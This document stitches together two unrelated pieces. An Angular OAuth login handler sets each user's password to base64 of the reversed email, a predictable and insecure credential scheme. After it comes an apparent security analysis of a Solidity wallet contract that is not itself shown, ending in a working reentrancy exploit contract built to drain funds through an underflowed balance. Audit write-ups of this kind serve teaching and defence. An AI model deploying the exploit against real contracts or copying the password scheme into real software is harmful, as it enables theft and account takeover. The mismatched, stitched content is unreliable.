ngOnInit (): void {
  this.userService.oauthLogin(this.parseRedirectUrlParams().access_token).subscribe({
    next: (profile: any) => {
      const password = btoa(profile.email.split('').reverse().join(''))
      this.userService.save({ email: profile.email, password, passwordRepeat: password }).subscribe({
        next: () => {
          this.login(profile)
        },
        error: () => { this.login(profile) }
      })
    },
    error: (error) => {
      this.invalidateSession(error)
      this.ngZone.run(async () => await this.router.navigate(['/login']))
    }
  })
}

analysis:
Data Path:
- Source: Untrusted external caller via public function `withdraw(uint _amount)`.
- Sanitization/Validation: Lines 23-26 check `_amount <= 0.1 ether`, `balances[msg.sender] >= _amount`, and `if (userWithdrawing[msg.sender] <= 1) userWithdrawing[msg.sender] += 1;`. The reentrancy guard is defective because it allows `userWithdrawing[msg.sender]` to be incremented twice (from 0 to 1, then from 1 to 2) before rejecting further calls, permitting one reentrant invocation.
- Sink: Line 32 sends ETH to `msg.sender` via low-level call `msg.sender.call{ value: _amount }("")` BEFORE deducting the sender's balance at line 34.

Vulnerability Analysis:
The contract violates the Checks-Effects-Interactions pattern. When `withdraw` is invoked, it makes an external call to `msg.sender` with the requested Ether before updating `balances[msg.sender]`. During the external call, execution is handed over to the recipient's fallback/receive function, which can call `withdraw` again. Because the first invocation's state update has not occurred, `balances[msg.sender]` remains intact and passes the balance check on line 24. Furthermore, because Solidity 0.6.12 does not include automatic arithmetic overflow/underflow checks and line 34 uses raw `-=` instead of SafeMath (`sub`), the second deduction upon returning from the re-entrant call underflows `0 - _amount` into `2^256 - _amount`, giving the attacker an astronomical balance and allowing complete drainage of all contract funds.

Conceptual Exploit Payload:
```solidity
contract Exploit {
    ETHWalletBank public target;
    uint256 public count;

    constructor(address payable _target) public payable {
        target = ETHWalletBank(_target);
    }

    function attack() external payable {
        target.ethdeposit{value: 0.1 ether}(address(this));
        target.withdraw(0.1 ether);
    }

    receive() external payable {
        if (count == 0) {
            count++;
            target.withdraw(0.1 ether); // Reentrancy: userWithdrawing becomes 2, balance check passes
        }
    }
}
```
After executing `attack()`, the attacker contract receives 0.2 ETH from a 0.1 ETH deposit, and target's `balances[address(this)]` underflows on line 34, allowing the attacker to drain the entire contract.

